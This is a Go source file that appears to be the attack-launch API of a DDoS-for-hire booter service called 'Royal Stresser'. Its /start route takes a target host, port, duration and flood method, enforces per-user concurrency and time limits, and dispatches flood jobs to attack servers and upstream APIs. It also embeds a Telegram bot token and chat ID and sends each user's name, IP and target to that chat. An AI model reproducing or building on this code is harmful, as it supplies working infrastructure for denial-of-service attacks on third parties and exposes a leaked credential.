package attackapi

import (
	"api/core/database"
	"api/core/master/sessions"
	"api/core/models/apis"
	"api/core/models/floods"
	"api/core/models/functions"
	"api/core/models/server"
	"api/core/models/servers"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"reflect"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func KeyByRealIP(r *http.Request) string {
	var ip string

	if tcip := r.Header.Get("True-Client-IP"); tcip != "" {
		ip = tcip
	} else if xrip := r.Header.Get("X-Real-IP"); xrip != "" {
		ip = xrip
	} else if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		i := strings.Index(xff, ", ")
		if i == -1 {
			i = len(xff)
		}
		ip = xff[:i]
	} else if ccip := r.Header.Get("CF-Connecting-IP"); ccip != "" {
		ip = ccip
	} else {
		var err error
		ip, _, err = net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			ip = r.RemoteAddr
		}
	}

	return ip
}

func sendTelegramLog(message, username, ip, method, target, timestamp string, success bool) {
	token := "6924113960:AAHxSCJJ0zbDHh8zvbd9iZaYg6e85GHqAy0"
	chatID := "-4718955831"

	status := "Success"
	if !success {
		status = "Failure"
	}

	telegramMessage := fmt.Sprintf(
		"*Royal Stresser Log*\n"+
			"Status: %s\n"+
			"Username: %s\n"+
			"IP: %s\n"+
			"Method: %s\n"+
			"Target: %s\n"+
			"Timestamp: %s\n"+
			"Details: %s",
		status, username, ip, method, target, timestamp, message,
	)

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       telegramMessage,
		"parse_mode": "Markdown",
	}

	jsonPayload, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Printf("Failed to send Telegram log: %v", err)
	} else {
		resp.Body.Close()
	}
}

func init() {
	Route.NewSub(server.NewRoute("/start", func(w http.ResponseWriter, r *http.Request) {
		type status struct {
			Status  string `json:"status"`
			Message string `json:"message"`
			Attacks []int  `json:"attack_ids"`
		}
		switch strings.ToLower(r.Method) {
		case "get":
			key, ok := functions.GetKey(w, r)
			if !ok {
				return
			}
			if !key.HasPermission("api") {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "You do not have API access!"})
				return
			}
			data := functions.GetQuerys(w, r, map[string]bool{"target": true, "port": true, "time": true, "method": true, "threads": false, "pps": false, "concurrents": false, "subnet": false})
			if data == nil {
				return
			}

			flood := floods.New(data["method"])
			if flood == nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid attack method provided!"})
				return
			}
			flood.Target = data["target"]
			flood.Parent = key.ID

			var conns = 1
			ongoing, _ := database.Container.GetRunning(key)
			if len(ongoing) > key.Concurrents {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Maximum running attacks reached!"})
				return
			}
			if _, ok := data["concurrents"]; ok {
				conncurrents, err := strconv.Atoi(data["concurrents"])
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid concurrent amount provided!"})
					return
				} else if conncurrents+len(ongoing) > key.Concurrents {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "You're trying to attack with more concurrents than you have available!"})
					return
				}
				conns = conncurrents
			}

			duration, err := strconv.Atoi(data["time"])
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid attack duration provided!"})
				return
			} else if duration > key.Duration {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Provided attack duration exceeds max time!"})
				return
			}
			flood.Duration = duration

			port, err := strconv.Atoi(data["port"])
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid destination port provided!"})
				return
			} else if port < 0 || port > 65535 {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Provided port is below 0 or over 65535!"})
				return
			}
			flood.Port = port

			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "No available slot to start attack!"})
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "No available slot to start attack!"})
					return
				}
			}

			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(key, flood)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "Database error occurred!"})
					return
				}
				ids = append(ids, id)
				time.Sleep(500 * time.Microsecond)
			}
			if key.HasPermission("admin") {
				go apis.Send(flood)
			}
			for i := 0; i < conns; i++ {
				servers.Distribute(flood)
			}
			functions.WriteJson(w, status{Status: "success", Message: "Attack successfully started", Attacks: ids})
		case "post":
			ok, user := sessions.IsLoggedIn(w, r)
			if !ok {
				return
			}
			r.ParseForm()
			fmt.Println(r.PostForm)
			userIP := KeyByRealIP(r)
			target := r.PostFormValue("host")

			// Déplacez `sendTelegramLog` à l'intérieur d'une condition avec les bonnes données
			if !isValidTarget(target) {
				message := "Invalid target format."
				sendTelegramLog(message, user.Username, userIP, r.PostFormValue("method"), target, time.Now().Format(time.RFC3339), false)
				json.NewEncoder(w).Encode(status{Status: "error", Message: message})
				return
			}

			if isBlacklisted(target) {
				message := "Target is blacklisted @royaloakapdc ."
				sendTelegramLog(message, user.Username, userIP, r.PostFormValue("method"), target, time.Now().Format(time.RFC3339), false)
				json.NewEncoder(w).Encode(status{Status: "error", Message: fmt.Sprintf("Target '%s' is blacklisted!", target)})
				return
			}

			// Lorsque l'attaque est réussie
			message := "Attack successfully started."
			sendTelegramLog(message, user.Username, userIP, r.PostFormValue("method"), target, time.Now().Format(time.RFC3339), true)

			flood := floods.New(r.PostFormValue("method"))
			if flood == nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid attack method provided!"})
				return
			}
			flood.Target = r.PostFormValue("host")
			flood.Parent = user.ID

			var conns = 1
			ongoing, _ := database.Container.GetRunning(user.User)
			if len(ongoing) > user.Concurrents {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Maximum running attacks reached!"})
				return
			}
			if ok := r.PostFormValue("concurrents"); ok != "" {
				val := strings.Split(r.PostFormValue("concurrents"), ".")[0]
				conncurrents, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid concurrent amount provided!"})
					return
				} else if conncurrents+len(ongoing) > user.Concurrents {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "You're trying to attack with more concurrents than you have available!"})
					return
				}
				conns = conncurrents
			}

			duration, err := strconv.Atoi(r.PostFormValue("duration"))
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid attack duration provided!"})
				log.Println(err)
				return
			} else if duration > user.Duration {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Provided attack duration exceeds max time!"})
				return
			}
			flood.Duration = duration

			port, err := strconv.Atoi(r.PostFormValue("port"))
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Invalid destination port provided!"})
				return
			} else if port < 0 || port > 65535 {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "Provided port is below 0 or over 65535!"})
				return
			}
			flood.Port = port

			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "No available slot to start attack!"})
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "No available slot to start attack!"})
					return
				}
			}

			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(user.User, flood)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "Database error occurred!"})
					return
				}

				servers.Distribute(flood)
				ids = append(ids, id)
			}
			go apis.Send(flood)
			functions.WriteJson(w, status{Status: "success", Message: "Attack successfully started", Attacks: ids})
		}
	}))
}

func Copy(source interface{}, destin interface{}) {
	x := reflect.ValueOf(source)
	if x.Kind() == reflect.Ptr {
		starX := x.Elem()
		y := reflect.New(starX.Type())
		starY := y.Elem()
		starY.Set(starX)
		reflect.ValueOf(destin).Elem().Set(y.Elem())
	} else {
		destin = x.Interface()
	}
}
func isValidTarget(target string) bool {
	if net.ParseIP(target) != nil {
		return true
	}

	// Vérifie si c'est un domaine valide avec http/https
	domainRegex := `^(https?://)([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$`
	match, _ := regexp.MatchString(domainRegex, target)
	return match
}

// Vérifie si une cible est dans la liste noire
func isBlacklisted(target string) bool {
	blacklists, err := database.Container.GetAllBlacklists()
	if err != nil {
		log.Println("isBlacklisted(): error fetching blacklists:", err)
		return false
	}
	for _, blacklist := range blacklists {
		if strings.Contains(target, blacklist) {
			return true
		}
	}
	return false
}
